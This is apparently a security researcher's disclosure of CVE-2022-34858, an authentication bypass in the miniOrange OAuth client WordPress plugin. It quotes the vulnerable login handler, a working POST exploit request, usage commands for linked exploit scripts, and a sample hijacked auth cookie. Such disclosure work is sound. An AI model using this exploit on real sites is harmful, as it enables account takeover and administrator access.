
[Skip to content](#content)

[![Lana Report](https://lana.report/wp-content/uploads/lana-report-inverse-text-logo-with-mascot.png)](https://lana.report/)

* [Front Page](https://lana.report/)
* [Reports](https://lana.report/vulnerability/)
* [Publications](https://lana.report/publication/)

1. [Lana Report](https://lana.report/)
2. [Publications](https://lana.report/publication/)

### OAuth 2.0 client for SSO by miniOrange WordPress plugin Authentication Bypass

REPORT ID: df23b19f-4134-41d3-8cb3-9d44189b461b

The plugin contains an Auth Bypass vulnerability. To bypass authentication, we only need to know the userâ€™s email address. Depending on whose email address we know, we may even be given an administrator role on the clientâ€™s website.

#### Letâ€™s check the plugin

The `mo_oauth_login_validate()` function includes the following request handling:

```
if ( isset( $_REQUEST['option'] ) and strpos( $_REQUEST['option'], 'mooauth' ) !== false ) {

	$user_email = '';
	if ( array_key_exists( 'email', $_POST ) ) {
		$user_email = sanitize_email( $_POST['email'] );
	}

	if ( $user_email ) {
		if ( email_exists( $user_email ) ) { // user is a member
			$user    = get_user_by( 'email', $user_email );
			$user_id = $user->ID;
			wp_set_auth_cookie( $user_id, true );
		} else { // this user is a guest
			$random_password = wp_generate_password( 10, false );
			$user_id         = wp_create_user( $user_email, $random_password, $user_email );
			wp_set_auth_cookie( $user_id, true );
		}
	}
	wp_redirect( home_url() );
	exit;
}
```

We can see from the code that if we specify `$_POST['email']`, the plugin will log the user in using the [`wp_set_auth_cookie()`](https://developer.wordpress.org/reference/functions/wp_set_auth_cookie/) function. No verification or authentication. Nothing.

The other problem with the plugin is that if we give an email address in the request that does not exist in the database, it will create a new user, even if registration on the WordPress website is not enabled.

#### Letâ€™s see how we can exploit this vulnerability

We only need to send a POST request to exploit this vulnerability.

The HTTP request to the <https://lana.solutions/vdb/miniorange-oauth-client/> which is a test WordPress website:

```
POST /vdb/miniorange-oauth-client/ HTTP/1.1
Host: lana.solutions
Content-Type: application/x-www-form-urlencoded

option=mooauth&[[emailÂ protected]](/cdn-cgi/l/email-protection)
```
#### The exploit script

I created a Python script that returns the WordPress logged\_in and auth cookie:

Source: [miniorange\_oauth\_client\_plugin\_vdb\_get\_exploit\_cookie.py](https://gist.github.com/lana-codes/c60c987c91d6b097d5e6e6ae95c02f48)

How to use:

```
python3 miniorange_oauth_client_plugin_vdb_get_exploit_cookie.py --client_url="https://lana.solutions/vdb/miniorange-oauth-client/" --email="[[emailÂ protected]](/cdn-cgi/l/email-protection)"
```

Run the above command in the Linux terminal.

We get something like this:

```
wordpress_logged_in_7c51fdb9c753be4972c4c2d647b5ded1=test%7C1656911674%7C2PsqjZ8FHWAqXOhJFcIU7yQPaQFOwVIpOfdZmQEyavx%7C940bbe2d2e3736724984b401f8f829811e541ffe3eb948f407aeeaae11f423f6
```

Then all we have to do is set the cookie using the browserâ€™s Developer Tools on the clientâ€™s website, which in our case isÂ <https://lana.solutions/vdb/miniorange-oauth-client/>

#### The professional exploit script

I also created a Python script with Selenium that exploits the vulnerability and automatically opens the webpage in Google Chrome:

Source: [miniorange\_oauth\_client\_plugin\_vdb\_exploit\_with\_selenium.py](https://gist.github.com/lana-codes/4ee8c5fc44f91e2e99ab1b215718cf71)

How to use:

```
python3 miniorange_oauth_client_plugin_vdb_exploit_with_selenium.py --client_url="https://lana.solutions/vdb/miniorange-oauth-client/" --email="[[emailÂ protected]](/cdn-cgi/l/email-protection)"
```

Run the above command in the Linux (desktop version) terminal.

#### Try it

Feel free to try and use the lana.solutions/vdb WordPress websites for testing. I have set the roles and capabilities, so you can only get low level access to the website.

Client:Â <https://lana.solutions/vdb/miniorange-oauth-client/>

Server:Â <https://lana.solutions/vdb/miniorange-oauth-server/>

#### Additional tests

I created a Postman request for exploit: [Postman Web â€“ MiniOrange Auth Request](https://www.postman.com/lanacodes/workspace/lanavdb-workspace/request/21538882-55901db6-5254-4dc4-ba32-da541d34dc37)

Can be used by anyone after fork. The required variables are stored in the collection.

### References

Source Code
<https://wordpress.org/plugins/oauth-client/>

Source Code (Archive)
<https://lana.solutions/files/oauth-client-1.11.3.zip>

Repository
<https://plugins.svn.wordpress.org/oauth-client/?p=2730613>

Lana Report
<https://lana.report/vulnerability/ac0bec28-ea44-46ee-9a35-d42273bce8dd/>

CVE
[CVE-2022-34858](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-34858)

### Let's discuss

### Attributes

Catgory
WordPress Plugin

Vulnerability Discovered
2022-06-13

Post Published
2022-06-21

Post Updated
2023-05-27

Affected Version
<= 1.11.3

### Classification

Type
Authentication Bypass

### Researcher

Name
[IstvÃ¡n MÃ¡rton](https://lana.report "Visit IstvÃ¡n MÃ¡rtonâ€™s website")

Email
[[emailÂ protected]](/cdn-cgi/l/email-protection#adc4c3cbc2edc1ccc3cc83cec2c9c8de)

### Advertisement

### Support Us?

We would truly appreciate it if you bought us a bunny (food for a snow leopard).

[![buy me a bunny!](https://img.buymeacoffee.com/button-api/?text=buy me a bunny!&emoji=ðŸ°&slug=lanacodes&button_colour=0776eb&font_colour=ffffff&font_family=Lato&outline_colour=ffffff&coffee_colour=FFDD00)](https://www.buymeacoffee.com/lanacodes)

**Lana Passport**
Recommendation
Ã—

Hey, youâ€™re reading a publication about OAuth. Maybe youâ€™re interested in our secure OAuth server plugin?

[Buy itÂ ($89) from CodeCanyon.net](https://1.envato.market/lana-passport-oauth-20-server-for-wordpress)

![](https://lana.report/wp-content/uploads/lana-report-inverse-text-logo-with-mascot.png)

The Lana Report is a database containing vulnerabilities researched and published by Lana Solutions.

### General

* [Vulnerabilities](https://lana.report/vulnerability/)
* [Publications](https://lana.report/publication/)

### Lana Solutions

* [Lana Codes](https://lana.codes/)
### Wordfence

* [Bug Bounty Program](https://wordfence.com/refer/lanareport)

### Socials

* [Telegram](https://t.me/LanaReport)
* [Twitter](https://twitter.com/LanaReport)

Lana Report Â© 2024 All Rights Reserved.

Made with ðŸ’™ by [Lana Codes](https://lana.codes/)

